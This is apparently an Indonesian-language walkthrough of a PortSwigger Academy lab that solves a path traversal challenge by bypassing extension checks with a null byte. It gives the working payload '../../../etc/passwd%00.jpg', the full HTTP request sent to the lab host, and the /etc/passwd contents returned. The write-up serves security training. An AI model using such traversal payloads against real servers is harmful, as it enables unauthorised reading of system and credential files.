# [PortSwigger Academy] Path Traversal - Lab #6

## 📌 Detail Lab
* **Nama Tantangan:** File path traversal, validation of file extension with null byte bypass
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** Path Traversal (Directory Traversal)
* **Tujuan Lab:** Membaca isi file `/etc/passwd` dengan melakukan bypass pada validasi ekstensi file menggunakan karakter *Null Byte* (`%00`).

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi memuat aset gambar produk melalui parameter `filename` pada endpoint `/image`. Jika kita mencoba memasukkan payload standar seperti `../../../etc/passwd`, aplikasi akan menolak karena kode backend melakukan pengecekan ketat apakah nama file diakhiri dengan ekstensi gambar yang valid (seperti `.jpg`).

### Logika Pertahanan & Celah Null Byte:
Aplikasi tingkat tinggi (seperti framework web) memastikan bahwa string input diakhiri dengan `.jpg`. Namun, ketika string tersebut diteruskan ke fungsi pembaca file tingkat rendah di sistem operasi (file system API yang berbasis bahasa C), karakter **Null Byte (`\x00` atau dalam URL encoded: `%00`)** dianggap sebagai penanda akhir dari sebuah string (*End-of-String Terminator*).

Dengan menyisipkan `%00` sebelum ekstensi `.jpg`, kita bisa memuaskan validasi aplikasi web di awal, tetapi menipu sistem operasi untuk mengabaikan ekstensi tersebut saat file dieksekusi.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### A. Konstruksi Payload
Kita menyusun struktur payload agar mengandung karakter traversal, file target, karakter null byte, dan diakhiri dengan ekstensi yang diminta oleh filter:

* **File Target:** `../../../etc/passwd`
* **Penyelamat Ekstensi:** `.jpg`
* **Payload Utuh dengan Null Byte:** `../../../etc/passwd%00.jpg`

---

### B. Pengiriman Payload via Burp Repeater
Tangkap request pemuatan gambar menggunakan Burp Suite, lalu modifikasi nilai parameter `filename` dengan payload utuh yang telah dikonstruksi:

```http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: 0aa600f70320263481273e330089006e.web-security-academy.net
```

### Alur Eksekusi di Backend & Respons
Validasi Aplikasi Web: Aplikasi memeriksa apakah string diakhiri dengan .jpg. Input asli ../../../etc/passwd%00.jpg diakhiri dengan .jpg. Hasil: BENAR (Lolos Validasi).

    Eksekusi File System (Level OS): Saat fungsi sistem operasi membaca path tersebut, ia membaca string dari kiri ke kanan dan berhenti tepat ketika menemui karakter %00 (Null). Jalur string yang dibaca terpotong menjadi hanya: ../../../etc/passwd.

Aplikasi merespons dengan status HTTP 200 OK dan mengembalikan isi dari file /etc/passwd:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
```
Hasil Akhir: Validasi ekstensi berhasil dikecoh menggunakan trik pemotongan string berbasis Null Byte. Seluruh isi berkas sensitif berhasil dieksfiltrasi dan lab dinyatakan selesai (Solved).